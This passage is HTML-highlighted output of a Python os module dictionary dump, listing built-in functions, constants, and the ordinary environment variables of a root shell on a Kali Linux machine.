function unsetenv&gt;, <span class="string">&#x27;strerror&#x27;</span>: &lt;built-<span class="keyword">in</span> function strerror&gt;, <span class="string">&#x27;fchdir&#x27;</span>: &lt;built-<span class="keyword">in</span> function fchdir&gt;, <span class="string">&#x27;fsync&#x27;</span>: &lt;built-<span class="keyword">in</span> function fsync&gt;, <span class="string">&#x27;sync&#x27;</span>: &lt;built-<span class="keyword">in</span> function sync&gt;, <span class="string">&#x27;fdatasync&#x27;</span>: &lt;built-<span class="keyword">in</span> function fdatasync&gt;, <span class="string">&#x27;WCOREDUMP&#x27;</span>: &lt;built-<span class="keyword">in</span> function WCOREDUMP&gt;, <span class="string">&#x27;WIFCONTINUED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFCONTINUED&gt;, <span class="string">&#x27;WIFSTOPPED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFSTOPPED&gt;, <span class="string">&#x27;WIFSIGNALED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFSIGNALED&gt;, <span class="string">&#x27;WIFEXITED&#x27;</span>: &lt;built-<span class="keyword">in</span> function WIFEXITED&gt;, <span class="string">&#x27;WEXITSTATUS&#x27;</span>: &lt;built-<span class="keyword">in</span> function WEXITSTATUS&gt;, <span class="string">&#x27;WTERMSIG&#x27;</span>: &lt;built-<span class="keyword">in</span> function WTERMSIG&gt;, <span class="string">&#x27;WSTOPSIG&#x27;</span>: &lt;built-<span class="keyword">in</span> function WSTOPSIG&gt;, <span class="string">&#x27;fstatvfs&#x27;</span>: &lt;built-<span class="keyword">in</span> function fstatvfs&gt;, <span class="string">&#x27;statvfs&#x27;</span>: &lt;built-<span class="keyword">in</span> function statvfs&gt;, <span class="string">&#x27;confstr&#x27;</span>: &lt;built-<span class="keyword">in</span> function confstr&gt;, <span class="string">&#x27;sysconf&#x27;</span>: &lt;built-<span class="keyword">in</span> function sysconf&gt;, <span class="string">&#x27;fpathconf&#x27;</span>: &lt;built-<span class="keyword">in</span> function fpathconf&gt;, <span class="string">&#x27;pathconf&#x27;</span>: &lt;built-<span class="keyword">in</span> function pathconf&gt;, <span class="string">&#x27;abort&#x27;</span>: &lt;built-<span class="keyword">in</span> function abort&gt;, <span class="string">&#x27;getloadavg&#x27;</span>: &lt;built-<span class="keyword">in</span> function getloadavg&gt;, <span class="string">&#x27;urandom&#x27;</span>: &lt;built-<span class="keyword">in</span> function urandom&gt;, <span class="string">&#x27;setresuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setresuid&gt;, <span class="string">&#x27;setresgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function setresgid&gt;, <span class="string">&#x27;getresuid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getresuid&gt;, <span class="string">&#x27;getresgid&#x27;</span>: &lt;built-<span class="keyword">in</span> function getresgid&gt;, <span class="string">&#x27;getxattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function getxattr&gt;, <span class="string">&#x27;setxattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function setxattr&gt;, <span class="string">&#x27;removexattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function removexattr&gt;, <span class="string">&#x27;listxattr&#x27;</span>: &lt;built-<span class="keyword">in</span> function listxattr&gt;, <span class="string">&#x27;get_terminal_size&#x27;</span>: &lt;built-<span class="keyword">in</span> function get_terminal_size&gt;, <span class="string">&#x27;cpu_count&#x27;</span>: &lt;built-<span class="keyword">in</span> function cpu_count&gt;, <span class="string">&#x27;get_inheritable&#x27;</span>: &lt;built-<span class="keyword">in</span> function get_inheritable&gt;, <span class="string">&#x27;set_inheritable&#x27;</span>: &lt;built-<span class="keyword">in</span> function set_inheritable&gt;, <span class="string">&#x27;get_blocking&#x27;</span>: &lt;built-<span class="keyword">in</span> function get_blocking&gt;, <span class="string">&#x27;set_blocking&#x27;</span>: &lt;built-<span class="keyword">in</span> function set_blocking&gt;, <span class="string">&#x27;scandir&#x27;</span>: &lt;built-<span class="keyword">in</span> function scandir&gt;, <span class="string">&#x27;fspath&#x27;</span>: &lt;built-<span class="keyword">in</span> function fspath&gt;, <span class="string">&#x27;getrandom&#x27;</span>: &lt;built-<span class="keyword">in</span> function getrandom&gt;, <span class="string">&#x27;memfd_create&#x27;</span>: &lt;built-<span class="keyword">in</span> function memfd_create&gt;, <span class="string">&#x27;waitstatus_to_exitcode&#x27;</span>: &lt;built-<span class="keyword">in</span> function waitstatus_to_exitcode&gt;, <span class="string">&#x27;environ&#x27;</span>: environ(&#123;<span class="string">&#x27;COLORTERM&#x27;</span>: <span class="string">&#x27;truecolor&#x27;</span>, <span class="string">&#x27;DISPLAY&#x27;</span>: <span class="string">&#x27;:0.0&#x27;</span>, <span class="string">&#x27;LANG&#x27;</span>: <span class="string">&#x27;en_US.UTF-8&#x27;</span>, <span class="string">&#x27;LANGUAGE&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;PATH&#x27;</span>: <span class="string">&#x27;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games&#x27;</span>, <span class="string">&#x27;TERM&#x27;</span>: <span class="string">&#x27;xterm-256color&#x27;</span>, <span class="string">&#x27;XAUTHORITY&#x27;</span>: <span class="string">&#x27;/home/kali/.Xauthority&#x27;</span>, <span class="string">&#x27;LS_COLORS&#x27;</span>: <span class="string">&#x27;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36::ow=30;44:&#x27;</span>, <span class="string">&#x27;MAIL&#x27;</span>: <span class="string">&#x27;/var/mail/root&#x27;</span>, <span class="string">&#x27;LOGNAME&#x27;</span>: <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;HOME&#x27;</span>: <span class="string">&#x27;/root&#x27;</span>, <span class="string">&#x27;SHELL&#x27;</span>: <span class="string">&#x27;/usr/bin/zsh&#x27;</span>, <span class="string">&#x27;SUDO_COMMAND&#x27;</span>: <span class="string">&#x27;/usr/bin/su&#x27;</span>, <span class="string">&#x27;SUDO_USER&#x27;</span>: <span class="string">&#x27;kali&#x27;</span>, <span class="string">&#x27;SUDO_UID&#x27;</span>: <span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;SUDO_GID&#x27;</span>: <span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;COMMAND_NOT_FOUND_INSTALL_PROMPT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;POWERSHELL_UPDATECHECK&#x27;</span>: <span class="string">&#x27;Off&#x27;</span>, <span class="string">&#x27;POWERSHELL_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;DOTNET_CLI_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;SHLVL&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;PWD&#x27;</span>: <span class="string">&#x27;/home/kali/Desktop&#x27;</span>, <span class="string">&#x27;OLDPWD&#x27;</span>: <span class="string">&#x27;/home/kali&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_mb&#x27;</span>: <span class="string">&#x27;\x1b[1;31m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_md&#x27;</span>: <span class="string">&#x27;\x1b[1;36m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_me&#x27;</span>: <span class="string">&#x27;\x1b[0m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_so&#x27;</span>: <span class="string">&#x27;\x1b[01;33m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_se&#x27;</span>: <span class="string">&#x27;\x1b[0m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_us&#x27;</span>: <span class="string">&#x27;\x1b[1;32m&#x27;</span>, <span class="string">&#x27;LESS_TERMCAP_ue&#x27;</span>: <span class="string">&#x27;\x1b[0m&#x27;</span>, <span class="string">&#x27;_&#x27;</span>: <span class="string">&#x27;/usr/bin/python3&#x27;</span>&#125;), <span class="string">&#x27;F_OK&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;R_OK&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;W_OK&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;X_OK&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;NGROUPS_MAX&#x27;</span>: <span class="number">65536</span>, <span class="string">&#x27;TMP_MAX&#x27;</span>: <span class="number">238328</span>, <span class="string">&#x27;WCONTINUED&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;WNOHANG&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;WUNTRACED&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;O_RDONLY&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;O_WRONLY&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;O_RDWR&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;O_NDELAY&#x27;</span>: <span class="number">2048</span>, <span class="string">&#x27;O_NONBLOCK&#x27;</span>: <span class="number">2048</span>, <span class="string">&#x27;O_APPEND&#x27;</span>: <span class="number">1024</span>, <span class="string">&#x27;O_DSYNC&#x27;</span>: <span class="number">4096</span>, <span class="string">&#x27;O_RSYNC&#x27;</span>: <span class="number">1052672</span>, <span class="string">&#x27;O_SYNC&#x27;</span>: <span class="number">1052672</span>, <span class="string">&#x27;O_NOCTTY&#x27;</span>: <span class="number">256</span>, <span class="string">&#x27;O_CREAT&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;O_EXCL&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;O_TRUNC&#x27;</span>: <span class="number">512</span>, <span class="string">&#x27;O_LARGEFILE&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;O_PATH&#x27;</span>: <span class="number">2097152</span>, <span class="string">&#x27;O_TMPFILE&#x27;</span>: <span class="number">4259840</span>, <span class="string">&#x27;PRIO_PROCESS&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;PRIO_PGRP&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;PRIO_USER&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;O_CLOEXEC&#x27;</span>: <span class="number">524288</span>, <span class="string">&#x27;O_ACCMODE&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;SEEK_HOLE&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;SEEK_DATA&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;O_ASYNC&#x27;</span>: <span class="number">8192</span>, <span class="string">&#x27;O_DIRECT&#x27;</span>: <span class="number">16384</span>, <span class="string">&#x27;O_DIRECTORY&#x27;</span>: <span class="number">65536</span>, <span class="string">&#x27;O_NOFOLLOW&#x27;</span>: <span class="number">131072</span>, <span class="string">&#x27;O_NOATIME&#x27;</span>: <span class="number">262144</span>, <span class="string">&#x27;EX_OK&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;EX_USAGE&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;EX_DATAERR&#x27;</span>: <span class="number">65</span>, <span class="string">&#x27;EX_NOINPUT&#x27;</span>: <span class="number">66</span>, <span class="string">&#x27;EX_NOUSER&#x27;</span>: <span class="number">67</span>, <span class="string">&#x27;EX_NOHOST&#x27;</span>: <span class="number">68</span>, <span class="string">&#x27;EX_UNAVAILABLE&#x27;</span>: <span class="number">69</span>, <span class="string">&#x27;EX_SOFTWARE&#x27;</span>: <span class="number">70</span>, <span class="string">&#x27;EX_OSERR&#x27;</span>: <span class="number">71</span>, <span class="string">&#x27;EX_OSFILE&#x27;</span>: <span class="number">72</span>, <span class="string">&#x27;EX_CANTCREAT&#x27;</span>: <span class="number">73</span>, <span class="string">&#x27;EX_IOERR&#x27;</span>: <span class="number">74</span>, <span class="string">&#x27;EX_TEMPFAIL&#x27;</span>: <span class="number">75</span>, <span class="string">&#x27;EX_PROTOCOL&#x27;</span>: <span class="number">76</span>, <span class="string">&#x27;EX_NOPERM&#x27;</span>: <span class="number">77</span>, <span class="string">&#x27;EX_CONFIG&#x27;</span>: <span class="number">78</span>, <span class="string">&#x27;ST_RDONLY&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;ST_NOSUID&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;ST_NODEV&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;ST_NOEXEC&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;ST_SYNCHRONOUS&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;ST_MANDLOCK&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;ST_WRITE&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;ST_APPEND&#x27;</span>: <span class="number">256</span>, <span class="string">&#x27;ST_NOATIME&#x27;</span>: <span class="number">1024</span>, <span class="string">&#x27;ST_NODIRATIME&#x27;</span>: <span class="number">2048</span>, <span class="string">&#x27;ST_RELATIME&#x27;</span>: <span class="number">4096</span>, <span class="string">&#x27;POSIX_FADV_NORMAL&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;POSIX_FADV_SEQUENTIAL&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;POSIX_FADV_RANDOM&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;POSIX_FADV_NOREUSE&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;POSIX_FADV_WILLNEED&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;POSIX_FADV_DONTNEED&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;P_PID&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;P_PGID&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;P_ALL&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;P_PIDFD&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;WEXITED&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;WNOWAIT&#x27;</span>: <span class="number">16777216</span>, <span class="string">&#x27;WSTOPPED&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;CLD_EXITED&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;CLD_KILLED&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;CLD_DUMPED&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;CLD_TRAPPED&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;CLD_STOPPED&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;CLD_CONTINUED&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;F_LOCK&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;F_TLOCK&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;F_ULOCK&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;F_TEST&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;RWF_DSYNC&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;RWF_HIPRI&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;RWF_SYNC&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;RWF_NOWAIT&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;POSIX_SPAWN_OPEN&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;POSIX_SPAWN_CLOSE&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;POSIX_SPAWN_DUP2&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;SCHED_OTHER&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;SCHED_FIFO&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;SCHED_RR&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;SCHED_BATCH&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;SCHED_IDLE&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;SCHED_RESET_ON_FORK&#x27;</span>: <span class="number">1073741824</span>, <span class="string">&#x27;XATTR_CREATE&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;XATTR_REPLACE&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;XATTR_SIZE_MAX&#x27;</span>: <span class="number">65536</span>, <span class="string">&#x27;RTLD_LAZY&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;RTLD_NOW&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;RTLD_GLOBAL&#x27;</span>: <span class="number">256</span>, <span class="string">&#x27;RTLD_LOCAL&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;RTLD_NODELETE&#x27;</span>: <span class="number">4096</span>, <span class="string">&#x27;RTLD_NOLOAD&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;RTLD_DEEPBIND&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;GRND_RANDOM&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;GRND_NONBLOCK&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;MFD_CLOEXEC&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;MFD_ALLOW_SEALING&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;MFD_HUGETLB&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;MFD_HUGE_SHIFT&#x27;</span>: <span class="number">26</span>, <span class="string">&#x27;MFD_HUGE_MASK&#x27;</span>: <span class="number">63</span>, <span class="string">&#x27;MFD_HUGE_64KB&#x27;</span>: <span class="number">1073741824</span>, <span class="string">&#x27;MFD_HUGE_512KB&#x27;</span>: <span class="number">1275068416</span>, <span class="string">&#x27;MFD_HUGE_1MB&#x27;</span>: <span class="number">1342177280</span>, <span class="string">&#x27;MFD_HUGE_2MB&#x27;</span>: <span class="number">1409286144</span>, <span class="string">&#x27;MFD_HUGE_8MB&#x27;</span>: <span class="number">1543503872</span>, <span class="string">&#x27;MFD_HUGE_16MB&#x27;</span>: <span class="number">1610612736</span>, <span class="string">&#x27;MFD_HUGE_32MB&#x27;</span>: <span class="number">1677721600</span>, <span class="string">&#x27;MFD_HUGE_256MB&#x27;</span>: <span class="number">1879048192</span>, <span class="string">&#x27;MFD_HUGE_512MB&#x27;</span>: <span class="number">1946157056</span>, <span class="string">&#x27;MFD_HUGE_1GB&#x27;</span>: <span class="number">2013265920</span>, <span class="string">&#x27;MFD_HUGE_2GB&#x27;</span>: <span class="number">2080374784</span>, <span class="string">&#x27;MFD_HUGE_16GB&#x27;</span>: -<span class="number">2013265920</span>, <span class="string">&#x27;pathconf_names&#x27;</span>: &#123;<span class="string">&#x27;PC_ALLOC_SIZE_MIN&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;PC_ASYNC_IO&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;PC_CHOWN_RESTRICTED&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;PC_FILESIZEBITS&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;PC_LINK_MAX&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;PC_MAX_CANON&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;PC_MAX_INPUT&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;PC_NAME_MAX&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;PC_NO_TRUNC&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;PC_PATH_MAX&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;PC_PIPE_BUF&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;PC_PRIO_IO&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;PC_REC_INCR_XFER_SIZE&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;PC_REC_MAX_XFER_SIZE&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;PC_REC_MIN_XFER_SIZE&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;PC_REC_XFER_ALIGN&#x27;</span>: <span class="number">17</span>, <span class="string">&#x27;PC_SOCK_MAXBUF&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;PC_SYMLINK_MAX&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;PC_SYNC_IO&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;PC_VDISABLE&#x27;</span>: <span class="number">8</span>&#125;, <span class="string">&#x27;confstr_names&#x27;</span>: &#123;<span class="string">&#x27;CS_GNU_LIBC_VERSION&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;CS_GNU_LIBPTHREAD_VERSION&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;CS_LFS64_CFLAGS&#x27;</span>: <span class="number">1004</span>, <span class="string">&#x27;CS_LFS64_LDFLAGS&#x27;</span>: <span class="number">1005</span>, <span class="string">&#x27;CS_LFS64_LIBS&#x27;</span>: <span class="number">1006</span>, <span class="string">&#x27;CS_LFS64_LINTFLAGS&#x27;</span>: <span class="number">1007</span>, <span class="string">&#x27;CS_LFS_CFLAGS&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;CS_LFS_LDFLAGS&#x27;</span>: <span class="number">1001</span>, <span class="string">&#x27;CS_LFS_LIBS&#x27;</span>: <span class="number">1002</span>, <span class="string">&#x27;CS_LFS_LINTFLAGS&#x27;</span>: <span class="number">1003</span>, <span class="string">&#x27;CS_PATH&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_CFLAGS&#x27;</span>: <span class="number">1100</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_LDFLAGS&#x27;</span>: <span class="number">1101</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_LIBS&#x27;</span>: <span class="number">1102</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFF32_LINTFLAGS&#x27;</span>: <span class="number">1103</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_CFLAGS&#x27;</span>: <span class="number">1104</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_LDFLAGS&#x27;</span>: <span class="number">1105</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_LIBS&#x27;</span>: <span class="number">1106</span>, <span class="string">&#x27;CS_XBS5_ILP32_OFFBIG_LINTFLAGS&#x27;</span>: <span class="number">1107</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_CFLAGS&#x27;</span>: <span class="number">1108</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_LDFLAGS&#x27;</span>: <span class="number">1109</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_LIBS&#x27;</span>: <span class="number">1110</span>, <span class="string">&#x27;CS_XBS5_LP64_OFF64_LINTFLAGS&#x27;</span>: <span class="number">1111</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_CFLAGS&#x27;</span>: <span class="number">1112</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_LDFLAGS&#x27;</span>: <span class="number">1113</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_LIBS&#x27;</span>: <span class="number">1114</span>, <span class="string">&#x27;CS_XBS5_LPBIG_OFFBIG_LINTFLAGS&#x27;</span>: <span class="number">1115</span>&#125;, <span class="string">&#x27;sysconf_names&#x27;</span>: &#123;<span class="string">&#x27;SC_2_CHAR_TERM&#x27;</span>: <span class="number">95</span>, <span class="string">&#x27;SC_2_C_BIND&#x27;</span>: <span class="number">47</span>, <span class="string">&#x27;SC_2_C_DEV&#x27;</span>: <span class="number">48</span>, <span class="string">&#x27;SC_2_C_VERSION&#x27;</span>: <span class="number">96</span>, <span class="string">&#x27;SC_2_FORT_DEV&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;SC_2_FORT_RUN&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;SC_2_LOCALEDEF&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;SC_2_SW_DEV&#x27;</span>: <span class="number">51</span>, <span class="string">&#x27;SC_2_UPE&#x27;</span>: <span class="number">97</span>, <span class="string">&#x27;SC_2_VERSION&#x27;</span>: <span class="number">46</span>, <span class="string">&#x27;SC_AIO_LISTIO_MAX&#x27;</span>: <span class="number">23</span>, <span class="string">&#x27;SC_AIO_MAX&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;SC_AIO_PRIO_DELTA_MAX&#x27;</span>: <span class="number">25</span>, <span class="string">&#x27;SC_ARG_MAX&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;SC_ASYNCHRONOUS_IO&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;SC_ATEXIT_MAX&#x27;</span>: <span class="number">87</span>, <span class="string">&#x27;SC_AVPHYS_PAGES&#x27;</span>: <span class="number">86</span>, <span class="string">&#x27;SC_BC_BASE_MAX&#x27;</span>: <span class="number">36</span>, <span class="string">&#x27;SC_BC_DIM_MAX&#x27;</span>: <span class="number">37</span>, <span class="string">&#x27;SC_BC_SCALE_MAX&#x27;</span>: <span class="number">38</span>, <span class="string">&#x27;SC_BC_STRING_MAX&#x27;</span>: <span class="number">39</span>, <span class="string">&#x27;SC_CHARCLASS_NAME_MAX&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;SC_CHAR_BIT&#x27;</span>: <span class="number">101</span>, <span class="string">&#x27;SC_CHAR_MAX&#x27;</span>: <span class="number">102</span>, <span class="string">&#x27;SC_CHAR_MIN&#x27;</span>: <span class="number">103</span>, <span class="string">&#x27;SC_CHILD_MAX&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;SC_CLK_TCK&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;SC_COLL_WEIGHTS_MAX&#x27;</span>: <span class="number">40</span>, <span class="string">&#x27;SC_DELAYTIMER_MAX&#x27;</span>: <span class="number">26</span>, <span class="string">&#x27;SC_EQUIV_CLASS_MAX&#x27;</span>: <span class="number">41</span>, <span class="string">&#x27;SC_EXPR_NEST_MAX&#x27;</span>: <span class="number">42</span>, <span class="string">&#x27;SC_FSYNC&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;SC_GETGR_R_SIZE_MAX&#x27;</span>: <span class="number">69</span>, <span class="string">&#x27;SC_GETPW_R_SIZE_MAX&#x27;</span>: <span class="number">70</span>, <span class="string">&#x27;SC_INT_MAX&#x27;</span>: <span class="number">104</span>, <span class="string">&#x27;SC_INT_MIN&#x27;</span>: <span class="number">105</span>, <span class="string">&#x27;SC_IOV_MAX&#x27;</span>: <span class="number">60</span>, <span class="string">&#x27;SC_JOB_CONTROL&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;SC_LINE_MAX&#x27;</span>: <span class="number">43</span>, <span class="string">&#x27;SC_LOGIN_NAME_MAX&#x27;</span>: <span class="number">71</span>, <span class="string">&#x27;SC_LONG_BIT&#x27;</span>: <span class="number">106</span>, <span class="string">&#x27;SC_MAPPED_FILES&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;SC_MB_LEN_MAX&#x27;</span>: <span class="number">108</span>, <span class="string">&#x27;SC_MEMLOCK&#x27;</span>: <span class="number">17</span>, <span class="string">&#x27;SC_MEMLOCK_RANGE&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;SC_MEMORY_PROTECTION&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;SC_MESSAGE_PASSING&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;SC_MQ_OPEN_MAX&#x27;</span>: <span class="number">27</span>, <span 